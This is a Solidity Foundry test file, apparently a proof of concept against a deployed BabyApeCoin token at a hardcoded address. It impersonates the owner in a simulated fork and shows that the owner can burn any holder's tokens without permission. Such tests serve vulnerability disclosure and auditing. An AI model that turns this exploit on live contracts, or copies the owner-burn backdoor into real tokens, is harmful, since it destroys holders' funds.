```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;

import "forge-std/Test.sol";

interface IBabyApeCoin {
    function owner() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function burn(address _from, uint256 _amount) external;
    function totalSupply() external view returns (uint256);
}

contract ExploitTest is Test {
    IBabyApeCoin constant target = IBabyApeCoin(0xf8aa749821852bc54ea5dd84dd3842d28523fc86);
    address owner;
    address victim = address(0xdead);
    uint256 constant BURN_AMOUNT = 1_000_000 ether;

    function setUp() public {
        // Get the current owner of the contract (deployer/owner)
        owner = target.owner();
        vm.label(address(target), "BabyApeCoin");
        vm.label(owner, "Owner");

        // Ensure the test contract receives some tokens to simulate a victim balance
        // We'll transfer from the owner to a victim address (here we can use address(this) or victim).
        vm.startPrank(owner);
        require(target.balanceOf(owner) >= BURN_AMOUNT, "Owner has insufficient balance");
        target.transfer(victim, BURN_AMOUNT);
        vm.stopPrank();

        // Confirm victim received tokens
        require(target.balanceOf(victim) == BURN_AMOUNT, "Victim balance not correct");
    }

    function testOwnerCanBurnFromVictim() public {
        uint256 victimBalanceBefore = target.balanceOf(victim);
        assertGt(victimBalanceBefore, 0, "Victim must have balance");

        // Impersonate owner and call burn on victim
        vm.prank(owner);
        target.burn(victim, BURN_AMOUNT);

        uint256 victimBalanceAfter = target.balanceOf(victim);
        assertEq(victimBalanceAfter, victimBalanceBefore - BURN_AMOUNT, "Owner burned tokens without permission");
    }
}
```
